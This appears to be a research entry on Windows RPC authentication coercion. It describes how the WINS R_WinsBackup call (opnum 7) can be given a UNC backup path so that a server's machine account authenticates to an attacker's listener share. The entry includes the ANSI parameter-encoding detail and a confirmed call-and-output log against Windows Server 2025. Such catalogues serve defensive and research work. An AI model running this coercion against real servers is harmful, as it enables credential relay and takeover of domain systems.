# MS-RAIW - Remote call to R_WinsBackup (opnum 7)

## Summary

+ **Protocol**: [[MS-RAIW]: Remote Administrative Interface: WINS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/830a759d-3157-4bfa-901a-d7dcd860c3b9)

+ **Protocol UUID**: 45f52c28-7f9f-101a-b52b-08002b2efabe

+ **Protocol version**: 1.0

+ **SMB Named pipe**: `\pipe\WinsPipe` (also reachable over `ncacn_ip_tcp` via the endpoint mapper)

+ **Function name**: [`R_WinsBackup`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/304d718f-5d5c-4ceb-b7e7-68deac3dc703)

+ **Function operation number**: `7`

+ **Authenticated**: Yes (WINS control-level access)

## Description

`R_WinsBackup` backs up the WINS database to a caller-specified directory. The server writes into
that directory (with `\wins_bak\` appended), and the specification defines **no UNC or traversal
validation** on `pBackupPath` — so a UNC directory makes the WINS server (machine account) write to
it, coercing authentication.

Per [MS-RAIW] 3.1.4.7:

> - The R_WinsBackup caller SHOULD have control level access. If an RPC client with a lower access level calls this method, the server SHOULD return ERROR_ACCESS_DENIED.
> - The server returns ERROR_WINS_INTERNAL if *pBackupPath* points to a string that is longer than 255 characters.
> - **The database is always backed up to the path specified by *pBackupPath* with the string "\wins_bak\" appended.** If the client doesn't have sufficient permissions to create files in the specified directory or if the backup fails for any other reasons, the server SHOULD return an ERROR_FULL_BACKUP error.

### Marshalling trap — `pBackupPath` is LPBYTE, not LPWSTR

Unlike `R_WinsDoStaticInit`'s `pDataFilePath` (a Unicode `LPWSTR`), `R_WinsBackup`'s `pBackupPath`
is declared **`[in, string, ref] LPBYTE`** — an **ANSI/byte** string. A UNC path must be encoded as
single-byte characters (e.g. `\\host\share` as ASCII bytes), not UTF-16. Passing a wide string here
is the common mistake. It is also `ref` (MUST NOT be NULL). The `fIncremental` parameter is ignored
by the server.

### Conditions

+ **Privilege**: WINS **control-level access** (WINS admins).
+ **Prerequisite calls**: none. `ServerHdl` is the RPC binding handle.
+ **Trigger**: immediate — the server writes to `<pBackupPath>\wins_bak\` during the call.
+ **Coerced parameter**: `pBackupPath` (**ANSI** byte string), e.g. `\\<listener>\share` (≤ 255 chars).

## Function technical detail

```cpp
DWORD R_WinsBackup(
   [in] handle_t ServerHdl,
   [in, string, ref] LPBYTE pBackupPath,
   [in] SHORT fIncremental
 );
```

+ **pBackupPath**: ANSI (`LPBYTE`) directory path; `\wins_bak\` is appended by the server. MUST NOT be NULL, ≤ 255 characters. No UNC/traversal restriction in the spec.
+ **fIncremental**: ignored.

## Testing status — CONFIRMED

**Confirmed coercion on Windows Server 2025** (domain controller with the WINS feature installed),
2026-09-12. Bound the RAIW interface (`45f52c28-…`) over `ncacn_ip_tcp` (EPM), authenticated as an
administrator, listener on the UNC path, `pBackupPath` marshalled as an **ANSI** string:

```
R_WinsBackup(pBackupPath="\\<listener>\share" [ANSI], fIncremental=0)   [opnum 7]
  -> ERROR_FULL_BACKUP
  -> listener: Incoming connection; TMP-W-2025-DC1$ authenticated successfully
```

The WINS server (machine account) connected to the listener and authenticated when it went to write
the backup into `<pBackupPath>\wins_bak\`. `ERROR_FULL_BACKUP` is the expected tail — the machine
account cannot create the backup files on the attacker's share, but the outbound authentication (the
coercion) has already happened. A local-path control (`C:\Windows\Temp`) returned `ERROR_SUCCESS`
and created `wins_bak\`, confirming the call and the ANSI marshalling are correct. Requires WINS
control-level access. Between the two WINS vectors, `R_WinsDoStaticInit` (opnum 3) is cleaner
(LPWSTR and read-only); both coerce.

## References

+ Documentation of protocol [MS-RAIW]: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/830a759d-3157-4bfa-901a-d7dcd860c3b9

+ Documentation of function `R_WinsBackup` (opnum 7): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/304d718f-5d5c-4ceb-b7e7-68deac3dc703
